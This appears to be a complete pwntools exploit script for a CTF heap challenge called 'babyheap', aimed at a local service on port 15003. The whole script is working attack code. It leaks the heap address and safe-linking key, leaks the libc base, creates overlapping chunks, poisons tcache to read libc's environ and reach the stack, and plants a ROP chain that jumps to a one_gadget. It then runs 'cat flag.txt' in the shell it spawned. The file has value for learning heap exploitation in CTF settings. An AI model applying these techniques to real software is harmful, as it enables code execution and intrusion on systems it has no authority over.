#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch='amd64')
exe = './babyheap_patched'
libc = ELF("./libc.so.6")
rop = ROP("./libc.so.6")


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.LOCAL:
        return process([exe] + argv, *a, **kw)
    else:
        return remote("localhost", 15003)


gdbscript = '''
continue
'''.format(**locals())


def create(index, size):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())


def remove(index):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(index).encode())


def view(index, size):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.recvuntil(b": ")
    return io.recv(size)


def modify(index, size, content):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", str(index).encode())
    io.sendlineafter(b"> ", str(size).encode())
    io.sendlineafter(b"> ", content)


def decrypt(cipher):
    key = 0
    plain = 0

    for i in range(1, 6):
        bits = 64-12*i
        if (bits < 0):
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return (key, plain)


# -- Exploit goes here --

io = start()

create(0, 16)
create(1, 16)

remove(0)
remove(1)

create(0, 16)

a = int.from_bytes(view(0, 8), "little")
key, leak = decrypt(a)
heap = leak - 0x2a0
print(hex(key))
print(hex(heap))

remove(0)

for i in range(8):
    create(i, 0x100)

create(8, 0x10)
create(8, 0x10)
create(8, 0x10)

for i in range(8):
    remove(i)

for i in range(8):
    create(i, 16)

leak = int.from_bytes(view(7, 16)[8:16], "little")-0x219d00
libc.address = leak
rop.address = leak
print(hex(libc.address))


create(0, 0x38)  # a
modify(0, 0x38, p64(0x0)+p64(0x60)+p64(heap+0xb80)+p64(heap+0xb80))

create(1, 0x28)  # b
create(2, 0xf8)  # c

modify(1, 0x28, b"a"*0x20+p64(0x60))

for i in range(3, 10):
    create(i, 0xf8)

for i in range(3, 10):
    remove(i)

remove(2)

create(15, 0x158)

create(14, 0x28)
remove(14)
remove(1)

target = libc.symbols["environ"] ^ key
modify(15, 0x38, p64(0x0)*5 + p64(0x31) + p64(target))

create(11, 0x28)  # b
create(12, 0x28)  # target

stack = view(12, 8)
stack = int.from_bytes(stack, "little")-0x128
print(hex(stack))

create(14, 0x28)
remove(14)
remove(11)


target = stack ^ key
modify(15, 0x38, p64(0x0)*5 + p64(0x31) + p64(target))

create(11, 0x28)  # b
create(12, 0x28)  # target

exploit = p64(libc.bss()+0x78) + p64(rop.rsi.address + libc.address) + \
    p64(0x0) + p64(rop.ret.address + libc.address) + p64(0xebcf8+libc.address)

modify(12, 0x28, exploit)

io.sendlineafter(b"> ", b"5")
io.recvuntil(b"bye bye")
io.sendline(b"cat flag.txt")

flag = io.recvline(keepends=False)
print(flag)

io.close()
